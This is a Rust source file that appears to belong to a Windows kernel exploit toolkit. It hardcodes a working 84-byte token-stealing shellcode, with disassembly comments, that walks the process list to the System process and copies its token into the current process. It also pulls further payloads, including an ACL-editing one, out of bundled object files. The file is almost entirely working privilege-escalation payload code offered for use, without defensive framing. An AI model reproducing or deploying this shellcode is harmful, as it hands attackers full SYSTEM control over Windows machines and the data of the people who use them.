use byte_strings::concat_bytes;
use goblin::pe::section_table::IMAGE_SCN_CNT_CODE;
use goblin::Object;

pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
    return concat_bytes!(
        b"\x50",                             // 00000000:  push rax
        b"\x51",                             // 00000001:  push rcx
        b"\x52",                             // 00000002:  push rdx
        b"\x48\x33\xc0",                     // 00000003:  xor rax,rax
        b"\x65\x48\x8b\x80\x88\x01\x00\x00", // 00000006:  mov rax,[gs:rax+0x188]
        b"\x48\x8b\x80\xb8\x00\x00\x00",     // 0000000E:  mov rax,[rax+0xb8]
        b"\x48\x8b\xc8",                     // 00000015:  mov rcx,rax
        b"\xba\x04\x00\x00\x00",             // 00000018:  mov edx,0x4
        b"\x48\x8b\x80\x48\x04\x00\x00",     // 0000001D:  mov rax,[rax+0x448]
        b"\x48\x2d\x48\x04\x00\x00",         // 00000024:  sub rax,0x448
        b"\x48\x39\x90\x40\x04\x00\x00",     // 0000002A:  cmp [rax+0x440],rdx
        b"\x75\xea",                         // 00000031:  jnz 0x1d
        b"\x48\x8b\x90\xb8\x04\x00\x00",     // 00000033:  mov rdx,[rax+0x4b8]
        b"\x48\x89\x91\xb8\x04\x00\x00",     // 0000003A:  mov [rcx+0x4b8],rdx
        b"\x5a",                             // 00000041:  pop rdx
        b"\x59",                             // 00000042:  pop rcx
        b"\x58",                             // 00000043:  pop rax
        b"\x4d\x33\xe4",                     // 00000044:  xor r12,r12
        b"\x48\x83\xc4\x28",                 // 00000047:  add rsp,byte +0x28
        b"\x4c\x8b\xbc\x24\x88\x00\x00\x00", // 0000004B:  mov r15, [rsp+0x88]
        b"\xc3"                              // 00000053:  ret
    )
    .clone();
}

#[cfg(target_os = "windows")]
fn extract_shellcode_from_obj(shellcode_obj: &[u8]) -> Vec<u8> {
    let obj = Object::parse(shellcode_obj).expect("[-] Failed to parse object file");

    let mut instructions = Vec::new();

    if let Object::COFF(coff) = obj {
        for section in coff.sections.iter() {
            if section.characteristics & IMAGE_SCN_CNT_CODE != 0 {
                instructions.extend_from_slice(
                    &shellcode_obj[section.pointer_to_raw_data as usize..]
                        [..section.size_of_raw_data as usize],
                );
            }
        }
    } else {
        eprintln!("[-] The object file is not a COFF file");
    }

    if instructions.is_empty() {
        eprintln!("[-] No executable sections found in the object file");
    } else {
        println!("[+] Extracted {} bytes of shellcode", instructions.len());
    }

    instructions
}

#[cfg(target_os = "windows")]
pub fn token_stealing_shellcode() -> Vec<u8> {
    let shellcode_obj = include_bytes!("token_stealing.obj");
    extract_shellcode_from_obj(shellcode_obj)
}

#[cfg(target_os = "windows")]
pub fn acl_edit_shellcode() -> Vec<u8> {
    let shellcode_obj = include_bytes!("acl_edit.obj");
    extract_shellcode_from_obj(shellcode_obj)
}

#[cfg(target_os = "windows")]
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_token_stealing_shellcode_matches_fallback() {
        let shellcode = token_stealing_shellcode();
        let fallback = token_stealing_shellcode_fallback();

        assert_eq!(
            shellcode,
            fallback.to_vec(),
            "Shellcode from COFF file does not match the fallback shellcode"
        );
    }
}
